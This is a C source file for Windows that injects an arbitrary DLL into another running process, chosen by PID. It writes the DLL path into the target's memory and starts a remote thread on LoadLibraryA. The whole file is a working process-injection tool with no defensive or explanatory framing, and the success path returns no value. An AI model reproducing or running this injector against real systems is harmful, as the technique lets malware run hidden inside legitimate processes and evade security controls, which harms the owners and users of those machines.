#include <windows.h>
#include <stdio.h>





BOOL RemoteDllInject(DWORD dwProcessId, const char* dllPath) {

    HANDLE hProcess = NULL;
    LPVOID pRemoteMemory = NULL;
    HANDLE hThread = NULL;
    size_t dllPathLength = strlen(dllPath) + 1;

    // Open The Target Process by Its ID
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
    if (hProcess == NULL) {
        printf("[!] Failed to open process , Error: %d\n", GetLastError());
        return FALSE;
    }

    printf("[+] Got Handle To Remote Process\n");
       

    // Allocate Memory In The Remote Process For The Dll Path To Be Written
    pRemoteMemory = VirtualAllocEx(hProcess, NULL, dllPathLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pRemoteMemory == NULL) {
        printf("[!] Failed to allocate memory in the remote process , Error: %d\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Allocated Memory In Remote Thread , Address : 0x%p\n", pRemoteMemory);

    // Writing The Dll Path To The Remotely Allocated Memory
    if (!WriteProcessMemory(hProcess, pRemoteMemory, dllPath, dllPathLength, NULL)) {
        printf("[!] Failed to write DLL path into the remote process memory , Error: %d\n", GetLastError());
        return FALSE;
    }

    printf("[+] The Dll Path Wrote To The Remote Process Successfully\n");

    // GET THE ADDRESS OF 'LoadLibraryA' IN KERNEL32.DLL
    LPVOID pLoadLibraryA = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");

    // CREATE A REMOTE THREAD TO LOAD DLL IN TARGET PROCESS
    CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)pLoadLibraryA, pRemoteMemory, NULL, NULL);
    printf("[+] Thread Created On 'LoadLibraryA' And Dll Loaded Successfully\n");
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        printf("Usage: %s <Target Pid> <Full Dll PATH>\n", argv[0]);
        return 1;
    }

    DWORD dwProcessId = (DWORD)atoi(argv[1]);
    const char* dllPath = argv[2];

    if (!RemoteDllInject(dwProcessId, dllPath)) {
        printf("[!] Injection failed\n");
        return 1;
    }
    printf("[+] Successfully Injected The Dll To The Target Process With ID : [%d]\n", dwProcessId);
    printf("[+] Injection succeed\n");


    return 0;
}
